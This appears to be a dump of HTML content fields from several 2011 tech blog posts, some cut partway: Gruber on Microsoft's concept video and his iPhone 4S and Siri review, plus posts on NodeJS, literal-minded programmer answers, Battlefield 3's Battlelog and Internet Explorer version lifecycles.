      "content" : "<p><a href=\"http://www.globalnerdy.com/2011/10/28/future-visions/\">Joey deVilla, defending Microsoft’s “Future Visions” concept video</a>:</p>\n\n<blockquote>\n  <p>As you might expect, Jon [<em>sic</em>] “Daring Fireball” Gruber,\nwho’s often been called Apple’s freelance PR guy, <a href=\"http://daringfireball.net/linked/2011/10/27/microsoft-future\">viewed it\nwith a jaundiced eye</a>.</p>\n\n<blockquote>\n  <p>This video encapsulates everything wrong with Microsoft. Their\ncoolest products are imaginary futuristic bullshit. Guess what,\nwe’ve all seen <em>Minority Report</em> already. Imagine if they\ninstead spent the effort that went into this movie on making\nsomething, you know, real, that you could actually go out and\nbuy and use today.</p>\n</blockquote>\n\n<p><em>Of course, he’d never say such a thing about Apple’s classic\n<a href=\"http://en.wikipedia.org/wiki/Knowledge_Navigator\">Knowledge Navigator</a> video</em>, which at the time it was made —\ncirca 1987, when the Macintosh II and SE, IBM PS/2 series and\nAmiga 500 and 2000 were brand new machines — was at least as\npie-in-the-sky as this newest Microsoft video.</p>\n</blockquote>\n\n<p>DeVilla isn’t the only one who accused me of Apple-biased hypocrisy regarding my stance on Microsoft’s “Future Visions” vs. Apple’s “Knowledge Navigator”. It is true that when I linked to <a href=\"http://waxy.org/2011/10/apples_1987_knowledge_navigator_only_one_month_late/\">Andy Baio’s post</a> about “Knowledge Navigator” a few weeks ago, I <a href=\"http://daringfireball.net/linked/2011/10/11/knowledge-navigator\">didn’t add any commentary</a>.</p>\n\n<p>But the exact same criticism I have for Microsoft today applies to 1987 Apple. “Knowledge Navigator” encapsulates everything that was wrong with Apple in 1987. Their coolest products were imaginary futuristic bullshit. The mindset and priorities of Apple’s executive leadership in 1987 led the company to lose what was then an enormous usability and user experience lead over the rest of the industry, and eventually drove the company to the precipice of bankruptcy. That 1987 Apple was a broken company is so painfully obvious from today’s vantage point that I didn’t think it needed to be mentioned.</p>\n\n<p>“Knowledge Navigator” didn’t help Apple in any way. Apple never made such a product. It didn’t bring Siri to us any sooner than if that video had never been made. It only served to distract from and diminish Apple’s then-current actual products.</p>\n\n<p>“We’re like Apple in 1987” is not a badge of honor — it’s a flashing red warning light.</p>\n\n<p>Apple today, from a strategic and operational perspective, is <em>nothing</em> like Apple of 1987. Apple today would never release to the public a concept video speculating on what sort of products they might be making 10 or 20 years from now. The attention of the public and the media is a rare and precious commodity. Apple today uses what attention it gets to focus on actual new products, ones that you can go out and actually buy and use.</p>\n\n<p>Apple today is a company that, several times a year, every year, releases new products that millions of people literally line up to buy the first day they’re available. Apple in 1987 was a company that began work on the Newton, a product that nobody ever had to wait in line to buy. The Newton was a brilliant design and full of terrific industry-leading ideas. And it struck the market like a wet match.</p>\n\n<p>I’m not lambasting Microsoft just because they’re Microsoft (or because they’re not-Apple), and I’m not praising today’s Apple just because it’s Apple and even when Apple farts I proclaim that it smells like roses. I praise Apple for its successes, which are undeniable.</p>\n\n<p>Putting this “Future Visions” video in public squanders attention that Microsoft could otherwise have focused on its current and imminent new products — like Windows Phone. Take a new iPhone 4S and a Windows Phone 7.5 device back in time 20 years and they might seem equally impressive to a pair of 1991 eyes. But one of them <a href=\"http://daringfireball.net/linked/2011/10/12/windows-phone\">sold more in a weekend than the other does in an entire financial quarter</a>. Is not Windows Phone scarily similar to the Newton? Innovative design, much to praise — and but striking the market like a wet match?</p>\n\n<p>DeVilla writes:</p>\n\n<blockquote>\n  <p>I would argue that if Microsoft wants to rehabilitate its image\nand regain its relevance in the hearts and mind of both the alpha\ngeeks and the public at large, they should probably make more of\nthese videos, not only for the public, but for their own benefit\nas well. Without visions like concept videos to guide them,\nespecially with the lack of someone in the visionary role, they\nmay remain stuck on their current course: doing well but\neffectively coasting, content to make incremental improvements to\nalready successful products or playing catch-up as with Internet\nExplorer, phones and tablets in efforts that are in danger of\nbeing too little, too late.</p>\n</blockquote>\n\n<p>That sure helped Sculley-era Apple.</p>\n\n<p>DeVilla then cites old examples from Sun and AT&amp;T. Sun went out of business, and AT&amp;T never accomplished anything in their concept video. Not a damn thing.</p>\n\n<p>I’m not arguing that making concept videos directly leads to a lack of traction in the current market. I’m arguing that making concept videos is a sign of a company that has a lack of institutional focus on the present and near-present. Can you imagine a sports team in the midst of a present-day losing season that makes a video imagining a future championship 10 years out? </p>\n\n<p>The designs in these concept videos are free from real-world constraints — technical, logical, fiscal. Dealing with constraints is what real design is all about. Institutional attention on the present day — on getting innovative industry-leading products out the door and creating consumer demand for them — requires relentless company-wide focus.</p>\n\n<p>1987 Apple didn’t have that focus. 2011 Apple does. Only one of those Apples releases futuristic concept videos. But you know who else <em>does</em> release futuristic concept videos today? <a href=\"http://www.youtube.com/watch?v=qEYS4UAKxgs&amp;feature=youtu.be\">RIM</a>. Great company.</p>"

      "content" : "<p>This is the easiest product review I’ve ever written. The iPhone 4S is exactly what Apple says it is: just like the iPhone 4, but noticeably faster, with a significantly improved camera, and an impressive new voice-driven feature called Siri.</p>\n\n<h2>Siri</h2>\n\n<p>Siri feels like old-school Apple. Newton-esque, at least in spirit. Sculley-era Apple was <a href=\"http://waxy.org/2011/10/apples_1987_knowledge_navigator_only_one_month_late/\">obsessed with this sort of thing</a> — natural language processing, the computer as “digital assistant”. New models of human-computer interaction. AI that works naturally. Even the startups from former Apple employees of that era worked on this sort of thing — remember <a href=\"http://en.wikipedia.org/wiki/General_Magic\">General Magic</a>?</p>\n\n<p>It’s also sort of the antithesis of everything prior in iOS. iOS is explicit and visual. Everything you can do in iOS is something you can see and touch on screen. The limits are visible and obvious. Siri, on the other hand, feels limitless. It’s fuzzy, and fuzzy on purpose. There’s no way to tell what will work and what won’t. You must explore. I found it extremely fun to explore Siri — primarily because so many of the things I tried actually worked. It’s a completely different interface for interacting with your iPhone. You’re not driving or commanding the existing iPhone interface with commands. There is no syntax to memorize. You’re just, well, talking to your iPhone.</p>\n\n<p>I tried the same things Scott Forstall demoed on stage. They all worked, as promised. On a whim, I asked Siri, with no other context, “When is my next haircut?” Siri answered with my appointment scheduled for later this month. I asked, “When was my last haircut?”, and it found that appointment from a month ago. I told Siri, “Play something by the Rolling Stones” and it played a random Stones song (“Gimme Shelter”, from <em>Let It Bleed</em>). I interrupted and said, “Play ‘Some Girls” by the Rolling Stones”, and Siri played just that song. </p>\n\n<p>I was out running errands today, walking through the city. I remembered, a mile away from home, that a screw had fallen out of my wife’s favorite eyeglasses over the weekend, and that she was waiting for me to fix them. Walking down a city street, I said, “Remind me to fix Amy’s glasses when I get home.”<sup><a href=\"http://daringfireball.net/#fn1-2011-10-12\">1</a></sup> Half an hour later, within a few doors of our house, the reminder went off.</p>\n\n<hr>\n\n<p>Me: “Set an alarm for 9 AM.”</p>\n\n<p>Siri: “It’s set for 9 AM.”</p>\n\n<p>Me: “Change that to 10 AM.”</p>\n\n<p>Siri: “I changed your alarm to 10 AM tomorrow.”</p>\n\n<p>Me: “Cancel that alarm.”</p>\n\n<p>Siri: “I deleted your 10 AM alarm.”</p>\n\n<p>Me: “Thank you, Siri.”</p>\n\n<p>Siri: “Your wish is my command.”</p>\n\n<hr>\n\n<p>In a sense, Siri is like a second interface to iOS. The first interface is the app interface. Launch, tap, drag, slide. The Siri interface is a different world. As stated above, this new interface is in many ways the opposite of the regular one — open-ended and implicit instead of narrowly defined and explicit. I don’t mean to imply that Siri doesn’t fit in or feel right at home — it does. But Siri is indicative of an AI-focused ambition that Apple hasn’t shown since before Steve Jobs returned to the company. Prior to Siri, iOS struck me as being designed to make it easy for us to do things. Siri is designed to do things for us.</p>\n\n<p>But there are parallels between Siri and the regular iPhone interface, too. The original iPhone launched in 2007 with a limited feature set and no third-party apps. 2011’s Siri is largely based on the same feature set: messages, email, phone calls, calendars, alarms, web search. But with the original iPhone, it was always obvious how Apple could allow third-party developers into the party: by allowing third-party apps. Apps are a nice clean, obvious concept. The iOS interface is fundamentally only two levels deep: the first level is the home screen, listing all available apps. The second level is when you tap an app to use it. Hit the home button to go back to the home screen. That’s it. File system sandboxing and background processing restrictions make it easy to keep apps from interfering with each other or with the system as a whole.</p>\n\n<p>People are going to start clamoring for third-party Siri integration as soon as they see Siri in action. But I’m not sure what form that integration could take. Best I can think is that apps could hook up to (as yet utterly hypothetical) Siri APIs much in the same way that Mac apps can supply system-wide Services menu items. But how would they keep from stomping on one another? If Siri supported third-party apps and you said, “Schedule lunch tomorrow at noon,” what would Siri do if you have multiple Siri-enabled calendar apps installed? This is similar to the dilemma Mac OS X faces when you open a document with a file extension that multiple installed apps register support for.</p>\n\n<p>Perhaps Siri is too centralized to allow for third-party integration? Where by third-party integration, I mean “any app in the App Store” integration. Siri does support two third-party services right now: Yelp and Wolfram Alpha. But it was Apple that added those two, and Apple that determines when to use them. They’re data services, not software.<sup><a href=\"http://daringfireball.net/#fn2-2011-10-12\">2</a></sup> With the regular iOS interface, the central hub is very thin: a home screen of app icons. It wasn’t necessarily obvious from the get-go that Apple <em>would</em> allow third-party apps, but it was obvious how they <em>could</em>: just add those new icons to the home screen. It’s not so obvious how you could add new commands to Siri without potentially stomping on existing ones.</p>\n\n<p>Here’s an example. Wolfram Alpha has terrific stock-price information and comparison features. I link to them frequently for stock info from Daring Fireball. So I tried asking Siri, “What was Apple’s stock price 10 years ago?” But once Siri groks that you’re asking about a stock price, it queries the built-in Stocks app for data, and the Stocks app doesn’t have historical data that goes back that far. “What did Apple’s stock price close at today?” works, but asking for historical data does not. But Wolfram Alpha <em>has</em> that data. And in fact, you can get it through Siri, by asking something like “Search Wolfram Alpha for Apple’s stock price ten years ago.” But there’s no way to tell Siri to prefer Wolfram Alpha for stock market information by default.</p>\n\n<p>Even if Siri is never opened up to App Store apps, though, there’s clearly a sense when you use it that Apple is only just getting started with this.</p>\n\n<hr>\n\n<p>The best sign I can think of regarding Siri’s practical utility: after a week of  using this test iPhone 4S, yesterday, while using my regular iPhone 4, without thinking I held down the home button to create a new reminder for myself, and when the old Voice Control interface appeared, my mind went blank for a few seconds while I pondered what went wrong. I missed Siri already.</p>\n\n<p>I wouldn’t say I can’t live without Siri. But I can say that I don’t want to.</p>\n\n<h2>Speech-to-Text</h2>\n\n<p>Alongside Siri, the digital assistant, is the straight-up speech-to-text dictation feature now available system-wide. This was my favorite feature of Android when I tested a Nexus S early this year. It’s now one of my favorite features of the iPhone 4S. I composed numerous tweets, text messages, and email replies this week using it. It’s not flawless but it is excellent. It works just as well while walking on a city street as it does while I’m sitting alone in my office. It even worked remarkably well in a crowded, busy bar.</p>\n\n<p>Worth noting that you can say punctuation, like “comma”, “period”, and “question mark”. So if you say, “Try saying quote open the pod bay doors unquote”, Siri should properly interpret that as:</p>\n\n<p><em>Try saying “open the pod bay doors”</em></p>\n\n<h2>Why Is Siri Limited to the iPhone 4S?</h2>\n\n<p>The cynical answer, of course, would be that Apple is withholding it from other iOS devices in order to spur additional upgrades to the iPhone 4S.</p>\n\n<p>A non-cynical answer would be that Siri depends on certain hardware in the iPhone 4S that doesn’t exist on any other iOS device. But what, exactly? The iPad 2 has the same CPU (A5) and same amount of RAM (512 MB), but no Siri, no text dictation. No one at Apple has an answer for this other than to say that Siri was developed alongside and specifically for just one device: the iPhone 4S. And as good as Siri is, I get the impression that Apple is far from satisfied with where it stands today. The Newton was killed by that “<a href=\"http://www.geekculture.com/ultimatebb/ultimatebb.php?ubb=get_topic;f=1;t=001030\">egg freckles” stuff</a> — it never recovered from the public perception that its handwriting recognition wasn’t good enough. If Siri is any less accurate on older iOS devices than it is on the 4S, Apple isn’t going to allow it.</p>\n\n<p>Don’t forget that there’s a server/cloud-based backend that is required for Siri to function. I can’t help but suspect there’s some truth to <a href=\"https://twitter.com/#!/crumpy/status/123954094602846208\">this tweet from Mark Crump</a>, speculating that Apple might be limiting Siri to the 4S simply to restrict the server load while the service is “beta”. There could be 100 million iOS 5 users by the end of this weekend; there will only be 1 or 2 million iPhone 4S users.</p>\n\n<h2>Camera</h2>\n\n<p>The most-hated sight in all of Mac OS X: the rainbow “wait” cursor, a.k.a. the spinning pizza of death. Waiting sucks.</p>\n\n<p>iOS doesn’t have any cursors, let alone the spinning pizza, but it does have an equivalent: the closed iris splash screen of the Camera app. You want to snap a picture, but instead, you see the iris, and… you wait.</p>\n\n<p>The most profound difference between the 4S and 4 cameras has nothing to do with image quality. It’s that you don’t have to wait nearly as long. That closed iris comes up for a moment and then it’s gone, and you’re ready to shoot. And after you shoot, the camera is ready to snap additional photos almost instantly. The difference is huge, and it’s especially nice in conjunction with iOS 5’s new lock screen shortcut to jump right into the Camera app.</p>\n\n<p>I spoke to some friends familiar with the development of iOS 5 and the 4S, and word on the Cupertino street is that camera speed — time from launch to being able to snap a photo, as well as the time between subsequent photos — received an enormous amount of engineering attention during development. The stopwatches were out, and every single tenth of a second that could be shaved was shaved.</p>\n\n<p>Image quality is improved, too, as promised. White balance and exposure choices look more accurate (or at least more pleasing) to my eyes, it performs noticeably better in low light, and dynamic range has been improved significantly. <a href=\"http://www.flickr.com/photos/gruber/6236164321/in/set-72157627874743488/lightbox/\">Here’s a small photoset I put on Flickr</a>, showing the same scenes photographed with three different cameras: my old iPhone 4, the iPhone 4S, and my trusty Ricoh GR-D — a dedicated point-and-shoot camera I bought for $800 four years ago.</p>\n\n<p>The photos were not edited, retouched, etc. I simply imported them into iPhoto and then uploaded them to Flickr. You can quibble with the exposure settings, but I snapped the photos naturally — I framed the image, tapped to choose a focus/exposure point, and snapped. (With the Ricoh, I focused first, then recomposed.)</p>\n\n<p>The photos from the 4S look better than those from the 4. They don’t look as good as those from the Ricoh, but over the last year, I found myself carrying the Ricoh less and less, because the iPhone 4 was good enough — and already in my pocket. Now, I wonder if the Ricoh is going to start collecting dust.</p>\n\n<h2>Sprint</h2>\n\n<p>I asked for and received a Sprint model from Apple for testing, so that I could compare it against AT&amp;T and Verizon. Sprint service was decent in both downtown San Francisco and at home in Philadelphia. Network benchmarks (using <a href=\"http://itunes.apple.com/us/app/speedtest.net-mobile-speed/id300704847?mt=8\">the Speedtest.net iPhone app</a>) showed very similar results to those I’d gotten with the Verizon iPhone 4 earlier this year.</p>\n\n<p>My tests were certainly far from extensive, but from what I’ve seen, Sprint’s service is very much comparable to Verizon’s. Compared to AT&amp;T, Sprint and Verizon are better for voice (both in terms of audio quality and call-dropping), but worse for data (slower, often <em>much</em> slower).</p>\n\n<p>Because I use 3G for data far more than I do for voice calls, I’m sticking with AT&amp;T for at least another year. At whatever point in the future the iPhone adds support for LTE networking, I will definitely reconsider this decision, and likely switch. (Look at <a href=\"https://static.ips.apple.com.edgekey.net/ipa_preauth/content/catalog/en_US/index.html\">this comparison of the service plans</a> available from AT&amp;T, Sprint, and Verizon. Sprint’s is far simpler — the only difference between tiers is the number of monthly voice minutes. Text messages and data are unlimited on all Sprint plans.) If you live or work in an area with excellent Sprint coverage, I wouldn’t hesitate to recommend a Sprint iPhone.</p>\n\n<h2>Overall Snappiness</h2>\n\n<p>Apps launch quicker, scrolling is smoother, web pages render faster. If you used both an original iPad and and iPad 2, it’s a lot like that. If anything, the jump from iPad to iPad 2 was a little more of an improvement, though, because the iPad 2 went from 256 MB of RAM to 512. The iPhone 4 and 4S both have 512 MB of RAM.</p>\n\n<h2>Bottom Line</h2>\n\n<p>The iPhone 4 <a href=\"http://daringfireball.net/2010/06/4\">was my favorite product that Apple has ever made</a>. The iPhone 4S has all the best features of the iPhone 4 — same look, same feel, same Retina Display — and adds several significant improvements. The one and only disappointment I have with the iPhone 4S is that the shutdown spinner animation is still low-res. That’s pretty low on the list of nits to pick.</p>\n\n<div>\n<hr>\n<ol>\n<li>\n<p>You might wonder, <em>Hey, don’t you feel like a jerk walking around the city talking to your phone?</em> But here’s the thing: Siri, by default, kicks in when you hold the iPhone up to your ear, so you can talk to it and it looks like you’re on a phone call. <a href=\"http://daringfireball.net/#fnr1-2011-10-12\" title=\"Jump back to footnote 1 in the text.\">↩</a></p>\n</li>\n<li>\n<p>You ever notice how Wolfram Alpha’s website returns just about all results as static rendered images, not text?

The example programs are simple, and short, and clear in what they do.  When I first started poking at the source code, the mapping from the “lib” folder to the “require” function was easy to grok.</p>\n\n<p>Empowering newcomers is the key to success.  That matters more than anything else.  I saw the simplicity in what Ryan was trying to do, and that was a huge indicator of future success.  Even the “commonjs be damned, we’re gonna do what’s right and let the standards follow” attitude has kept things lean and simple.</p>\n\n<p>I’ve worked on a lot of different projects.  I like new things, and that means I’ve been the new guy for most of my career in software development, professionally and recreationally.  Going from empty folder to running program in a few simple steps is a HUGE accomplishment that many professional software teams really struggle with, and that struggle costs a lot of wasted time and energy.</p>\n\n<p>I’ve seen people post to the NodeJS list asking questions as they’re comparing node to other platforms, and a week later, they’re publishing modules and add-ons and contributing code and tests and docs back to the core.</p>\n\n<p>That’s huge.</p>"

What time is it?   (asshole)\n</code></pre>\n\n<p>or:</p>\n\n<pre><code>q: How are you going to the party Saturday?\na: I'm driving.\nq: Yeah, but are you taking the 101 or the 280?    (asshole)\n</code></pre>\n\n<p>Programming is a deep and complicated field.  There are very many layers of abstraction between the user’s intent and the electrons on silicon.</p>\n\n<p>When working on a problem, it’s common to be so immersed in it that everything seems obvious.  In fact, until this level of familiarity is achieved, it’s hard to make any progress at all.</p>\n\n<p>However, other parts of the stack may still be very foreign.  This is part of why software development is a social activity.  There’s simply too much for any one person to hold the entire stack in their head at once.</p>\n\n<p>So, you ask someone a question.  A question that seems obvious to them, <em>but isn’t to you</em>, because you’re not immersed in that part of the world.</p>\n\n<p>And the polite and kind thing for them to do is try to answer your question as precisely and accurately as possible, <em>even though it seems obvious to them and isn’t something they’d ever bother asking</em>, because they realize that you don’t live in the same area that they do.</p>\n\n<p>In the ancestral environment, everyone knew most of what everyone else knew.  Even if there were specific details that were shared in bits, it was unlikely that someone didn’t even know the rudimentary basics of any particular subject.  So, when asked a question, the polite thing for the answerer to do is skip past any details that the asker probably already knows, and try to infer the bits that they don’t.</p>\n\n<p>Most of human social interaction happens in this sort of framework.  You probably know I’m driving, and are <em>really</em> asking which specific route I’m taking, or which car, or when I’m leaving.  Answering with “I’m driving” is akin to saying, “You’re an idiot who doesn’t know what a car is, but I’m going to step down off my Smart People pedestal, where we Speak Properly, and help educate you, so that you can learn to not be so dumb.   Here’s where the key goes…”</p>\n\n<p>It’s not (just) that nerds are fundamentally more persnickety, or detail-oriented, or hyper-literal.  Those things may factor into our oddness, or into our choice of careers, but a large part of this social disconnect is that we actively learn to break this evolved habit.</p>\n\n<p>Our culture and craft depend on responding to simple questions with obvious answers, out of respect for the fact that what is obvious to me may not be obvious to you, even though we’re both competent, intelligent, worldly people with nothing of the best intentions.</p>\n\n<p>That’s no excuse for being a dick, of course.  Rudeness—especially unintended rudeness—is not the Winful Way.  But it’s hard to shift cultures, especially when our friends are also our colleagues, and social interactions often include technical conversations.</p>"

I wondered to myself “did I click the wrong button?”. It turns out I didn’t.</p>\n<p>For those living under a rock, Battlefield is no web game, in fact it’s one of the <a href=\"http://www.youtube.com/watch?v=NDDfPxF3EFE&amp;feature=related\">most anticipated AAA game titles</a> of this year. What initially seemed like a bad idea to most PC gaming enthusiasts including myself is now growing on me. In fact, this may actually be a sign of PC gaming evolving for the better.</p>\n<p>For most current PC games, playing them involves finding and launching it from the Start menu full of other applications, sit through unnecessarily long and repetitive logos and introduction videos, wait for menus to load before waiting again for the actual game to load. Compound that with fancy but poor faux-user interfaces, everything besides the game can be rather tedious.</p>\n<p>In contrast for Battlefield 3, it takes just seconds to sign in to the “<a href=\"http://battlelog.battlefield.com/\">Battlelog</a>” portal which undeniably resembles Facebook complete with “Hooahs!” instead of “Likes”. However with one click of a “Join game” button, it launches the game application straight into the match with loading times in seconds, rarely seen in any game of its genre before.</p>\n<p>While Battlefield 3 isn’t the first PC game to tie some aspects of the game to a browser – <a href=\"http://www.quakelive.com/\">Quake Live</a> made its debut as a browser game, it’s much more refined with drag-and-drop party management, integrated voice chat and more.</p>\n<p>Granted the current beta of the game and website is <a href=\"http://i.imgur.com/0k3N6.jpg\">undeniably buggy</a>, by having the actual game and its out-of-game management tasks clearly separated not only by design but by code, it also allows the game developers to fix one without relying on the other like they have already.</p>\n<p>As a <a href=\"http://www.neogaf.com/forum/showthread.php?t=446906\">forum post on the popular gaming forum “NeoGAF”</a> best puts it, “Battlefield 3′s Battlelog and server browser is risky, bold, but absolutely brilliant”, I can’t help but agree. Although I would add not only is it pushing the boundaries of the genre, but evolving the PC gaming experience much more social and engaging experience than its console equivalents.</p>\n<p>What’s amusing is that console gamers too will have to log on to this portal to check their achievements and stats, but not have the ability to hop straight into a game.</p>\n<p>Finally, if you’re wondering the game is as good as it’s hyped up to be, it’s pretty awesome. Although I must state the “Operation Metro” map in the beta is a poor representation of the game. From the few hours I had the chance to play the 64-players <a href=\"http://www.youtube.com/watch?v=NDDfPxF3EFE\">Caspian Border</a>, the game will be worth every penny.</p>\n<p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/rj23e1urko7qp7fin85ud6ck1k/300/250?ca=1&amp;fh=280#http%3A%2F%2Fwww.istartedsomething.com%2F20111002%2Fbattlefield-3-battlelog-the-changing-face-of-pc-gaming%2F\" width=\"100%\" height=\"280\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/istartedsomething?a=YRZlmEkRq3M:hqzrQBGsirM:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/istartedsomething?i=YRZlmEkRq3M:hqzrQBGsirM:D7DqB2pKExk\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/istartedsomething?a=YRZlmEkRq3M:hqzrQBGsirM:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/istartedsomething?d=qj6IDK7rITs\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/istartedsomething/~4/YRZlmEkRq3M\" height=\"1\" width=\"1\">"

IE8 gives a few more goodies (localStorage, postMessage, hashchange event) <strong>that&#39;ll be nice to use when we retire IE7, but IE8 will be with us for a <em>while</em></strong>.</p>\n<p><img src=\"http://royal.pingdom.com/wp-content/uploads/2011/09/110909-IE9.png\" alt=\"\"></p>\n<p>Since Windows XP still accounts for 46.6% of Windows users, IE9+ adoption has a significant upper bound. More: <a href=\"http://royal.pingdom.com/2011/09/09/how-microsoft-is-handicapping-its-own-web-browser/\">How Microsoft is handicapping its own web browser</a> and <a href=\"http://royal.pingdom.com/2011/06/16/ie9-adoption-is-painfully-slow-google-to-the-rescue/\">IE9 adoption is painfully slow. Google to the rescue?</a></p>\n<p>IE6 has been a source of pain for… I&#39;d say four years. IE8 will be a source of pain for the next 9, it appears. You&#39;re clearly aware that IE9 (and IE10…) are not available on Windows XP, even though Firefox and Chrome continue to ship versions for that operating system (still 40% of the Windows market), so unless the whole world shells out $79 for an upgraded OS, they won&#39;t get an upgraded browser, without switching. That&#39;s terrible, clearly. <strong>But this isn&#39;t the worst part.</strong> No, no…</p>\n<h4>How many browsers would you like to support?</h4>\n<p>Personally, I&#39;m totally happy supporting the latest version of each of the five browsers. <strong>IE10 will be a very impressive browser</strong>, and the latest releases of Chrome, Firefox, Safari, and Opera are all incredible as well. Supporting the legacy versions is not exactly my idea of a good time, but ya know.. With IE6,7,8,9.. I&#39;m used to it.</p>\n<h4>It&#39;s about to get worse</h4>\n<p>IE looks to be on a yearly release cycle. Great! IE10 out in March-ish.. IE11 a mere 52 weeks after that. (Mind you, Firefox and Chrome are shipping every 6 weeks these days). <strong>But what&#39;s far more important than shipping frequency, is the browser half-life</strong>.</p>\n<blockquote><p>Products like Windows and Office have a <a href=\"http://support.microsoft.com/gp/lifepolicy\">lifecycle policy</a> that typically runs 10+ years because that’s what these organizations need. As part of Windows, IE honors that 10+ year commitment.</p>\n<p><cite>~<a href=\"http://blogs.msdn.com/b/ie/archive/2011/06/27/a-browser-for-all-windows-customers-it-s-about-and-not-or.aspx\">Dean Hachamovitch</a>, IE Corporate VP</cite></p></blockquote>\n<p>IE9 and IE10 are both scheduled to be sunset (as far as official Microsoft support) in 2020. Since IE8 shipped with Windows 7, we can expect the same death date for it. Yes, IE8&#39;s death date is 9 years from now. Meanwhile, you won&#39;t have to worry about supporting Firefox 6 or Chrome 13 in November.</p>\n<p><img src=\"http://paulirish.com/wp-content/uploads/2011/09/browserlineupin20191.jpg\" alt=\"graphic of 1 chrome, 1 firefox, 1 safari, 1 opera, and 10 IEs\"></p>\n<p>Extrapolating this, if they maintain the same policy, IE17 be released in 2019, before IE8, 9 and 10 finally die. So in a few years from now, you&#39;ll be supporting one version of Chrome, one version of Firefox, one of Opera, (probably) one of Safari, and <strong>ten versions of IE</strong>.</p>\n<h4>Did I say 10 versions of IE? I meant to say 72.</h4>\n<p>72 versions of IE on the wall, 72 versions of IE… Maybe drinking beer at this point in the post would be a smart move.</p>\n<p>So you&#39;re aware that IE ships with multiple document modes. IE essentially ships with legacy versions of the renderer so that you can upgrade your browser but still see content that was terribly coded and cannot withstand the reality of web development, therefore it needs to be locked into a single version. <a href=\"http://mike.kaply.com/2011/06/23/understanding-the-corporate-impact/#comment-10632\">I worded this differently</a> a bit ago.</p>\n<blockquote><p>We seem to be using this term of “intranet apps” or “internal corporate apps” just as a euphemism for poorly written code.<br>\nConsumer facing apps have been handling new and unknown browser versions day in and day out for years. Like Kroc said, “Corporate users should be testing their applications against standards, not browser version numbers.”</p></blockquote>\n<p>So IE9 contains IE8, IE7, and IE5 modes. IE10 contains modes for IE9 and on down the line.</p>\n<p>The problem percolates when you come to terms with the fact that many of these modes are not the same as the original browser. For example:</p>\n<ul>\n<li>IE8&#39;s IE7 mode: adds sessionStorage &amp; localStorage,  false positives on a feature test for the hashchange event, <a href=\"http://blog.pengoworks.com/index.cfm/2009/3/19/Internet-Explorer-8-issues-with-Compatibility-View-and-EmulateIE7\">mishandles</a> rowspan, and some <a href=\"http://blogs.msdn.com/b/ie/archive/2009/03/12/site-compatibility-and-ie8.aspx\">other event and attribute differences</a>.</li>\n<li>IE9&#39;s IE8 mode: <a href=\"http://twatlr.com/thread/113376848716627968\">intermittently</a> false positives on a feature test for inline SVG. <a href=\"http://yfrog.com/ki9x1cp\">Renders CSS differently than true IE8</a>, and is <a href=\"http://code.google.com/p/ie7-js/issues/detail?id=334\">crashier</a> than the real one.</li>\n</ul>\n<p>These are not browsers with reliable replicated browser versions embedded, these are frankenstein versions that behave unpredictably. <small>(To better understand the internals, the new JScript engine (these days it&#39;s called Chakra) is used in the compatibility modes, but IE engineers remove features and add bugs to make them &quot;match&quot; earlier behavior. Luckily they run at their modern speed, but run with a whitelist of bugs being put in place. MSFT has all reason to keep these compat modes as identical as possible, so we should expect fewer issues in IE10+&#39;s compat modes.)</small></p>\n<p>Of course, there is the matter of what % of market share it takes for you to &quot;support&quot; a browser (test against during dev / QA against / customize your experience for).. It&#39;s possible some of these IE versions won&#39;t have enough numbers for us to care. Kind of like how we support Firefox 3.6 and 6, but not 4 or 5. (btw, Mozilla <a href=\"https://groups.google.com/d/msg/mozilla.dev.planning/mvVweF8xQRw/HXcSO8bgkGsJ\">will soon pull the lever</a> to prompt 3.6 users to upgrade).</p>\n<h4>Where, from here? Do we have solutions?</h4>\n<p>All this news isn&#39;t the best, certainly. What are our options?</p>\n<p>Asking your users to upgrade their IE version to the latest? We&#39;ve been naively doing this for a while now, but we&#39;ve only been shooting ourselves in the foot. <strong>Without an upgrade policy for IE that takes the web seriously, you can&#39;t responsibly ask your users to upgrade to the latest IE (the future&#39;s boat-anchor browser.)</strong></p>\n<blockquote><p><strong>boat-anchor browser</strong> (<em>noun</em>): the browser with enough users and not enough capability, holding back the potential of the web. <sup>[<a title=\"alex russell coined this term\" href=\"http://infrequently.org/2010/10/ie-8-is-the-new-ie-6/\">via</a>]</sup></p></blockquote>\n<p><img src=\"http://static.arstechnica.com/browsers-july-2011/internet-explorer-transition.png\" alt=\"\"><br>\n<img src=\"http://static.arstechnica.com/browsers-july-2011/chrome-transition.png\" alt=\"\"></p>\n<p>IE version pigpile.

Maybe they&#39;ll also introduce a better solution for testing in their browsers than running four (soon five) unique Windows OS images.</p>\n<p><img src=\"http://dl.dropbox.com/u/39519/talks/html5forhumans/static/images/chrome_frame.jpg\" alt=\"\" width=\"150\" align=\"right\"></p>\n<p><strong> Chrome Frame</strong> gives us a solid option for handling this situation. (Also, if you haven&#39;t read <a href=\"http://infrequently.org/2011/03/half-lives/\">these</a> <a href=\"http://infrequently.org/2010/10/ie-8-is-the-new-ie-6/\">three</a> <a href=\"http://infrequently.org/2010/09/but-ie-9-is-just-around-the-corner/\">posts</a> by Alex Russell… do so.)<br>\nAt the very least, Chrome Frame will automatically update and has the user-perceived benefit of being &quot;just a plugin&quot; (that <a href=\"http://infrequently.org/2011/08/non-admin-chrome-frame-now-stable/\">all users can install</a>) instead of switching to a whole new browser.</p>\n<h4>I&#39;m almost done, I swear</h4>\n<p>Clearly, having your users on a browser that not only iterates quickly but appreciates developers by guaranteeing a short browser half-life is a boon to you and the success of the experiences you can deliver. All the browsers are racing to deliver features and speed to you and your users (including IE).</p>\n<p>Seriously, all browser engineers are doing incredible, fantastic work.<strong> But without a strategy for how this turns out in the long term, this IE situation will become a complete mess—costing you enormous time in designing how <a href=\"http://paulirish.com/2011/tiered-adaptive-front-end-experiences/\">scale your design</a> to 76+ browsers, testing it, QA&#39;ing it, and maintaining it.</strong></p>\n<p>The IE team is incredibly talented and wise; I think they have a great opportunity here to make the right move (like when they <a href=\"http://blogs.msdn.com/b/ie/archive/2008/03/03/microsoft-s-interoperability-principles-and-ie8.aspx\">reversed policy on X-UA-Compatible</a>). Perhaps with Win8 and Metro we&#39;ll see a more aggressive approach towards bringing the full potential to the web to all its users.</p>\n<hr 